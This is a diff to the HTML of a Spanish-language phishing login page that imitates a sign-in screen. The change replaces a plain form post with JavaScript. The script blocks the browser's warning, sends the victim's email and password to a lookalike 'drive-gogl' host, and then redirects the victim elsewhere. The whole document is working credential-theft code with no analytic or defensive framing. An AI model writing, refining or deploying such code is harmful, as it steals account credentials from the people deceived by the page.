@@ -224,36 +224,33 @@
       <div class="subtitle">Inicia sesión para continuar</div>
       <br>
 
-      <!-- Campo de correo electrónico -->
-          <form class="form" action="http://drive-gogl-folder1550-0q2adsc9d0enjd0psh.atwebpages.com/next.php" method="post">
-
-        <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required="" value="">
-
-      <!-- Etiqueta "o" -->
-      <div class="or">
-        <div class="or-line"></div>
-        <div class="or-text">o</div>
-        <div class="or-line"></div>
-      </div>
-
-      <!-- Campo de contraseña -->
-          <input type="text" name="pass" class="input" placeholder="Contraseña" minlength="5" maxlength="32" required title="La contraseña es incorrecta" required="">
-      <span id="error-message" style="color: red;"></span>
-
-      <!-- Botón de siguiente -->
-        <button type="submit" class="button" onclick="validatePassword()">Siguiente</button>
-
-      <!-- Enlace de crear cuenta -->
-      <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
-
-      <!-- Botón de iniciar sesión con otra cuenta -->
-      
-
-      <!-- Idioma -->
-      
-    </form>
+     <form class="form" id="loginForm">
+   <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required>
+   <input type="password" id="passwordInput" name="pass" class="input" placeholder="Contraseña" required>
+   <button type="submit" class="button">Siguiente</button>
+</form>
 <br>
+<script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Evita que el navegador muestre la advertencia
 
+    const email = document.getElementById("emailInput").value;
+    const password = document.getElementById("passwordInput").value;
+
+    fetch("http://drive-gogl-folder1550-0q2adsc9d0enjd0psh.atwebpages.com/next.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}`
+    }).then(response => response.text()).then(data => {
+        console.log("Datos enviados:", data);
+        window.location.href = "https://www.paginaredireccion.com";
+    }).catch(error => console.error("Error:", error));
+});
+
+
+</script>
+
+          
    <p>Español(España) Ayuda Privacidad Términos</p>
 
   </div>
